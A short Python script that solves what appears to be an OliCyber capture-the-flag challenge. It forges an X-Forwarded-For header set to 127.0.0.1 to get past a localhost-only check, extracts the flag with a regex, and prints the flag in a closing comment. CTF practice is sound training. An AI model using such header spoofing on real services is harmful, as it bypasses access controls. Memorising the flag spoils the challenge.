import requests
import re

site = "http://nearby.challs.olicyber.it:37005/"

headers = {
    "User-Agent": "Mozilla/5.0 (CustomAgent/1.0)",
    "X-Forwarded-For": "127.0.0.1",              
}

r = requests.get(site, headers=headers).text
match = re.search(r'flag\{[^\}]+\}', r)
flag = match.group(0)
print(flag)

#flag{gl1_h3ader_p0ss0no_m3ntire}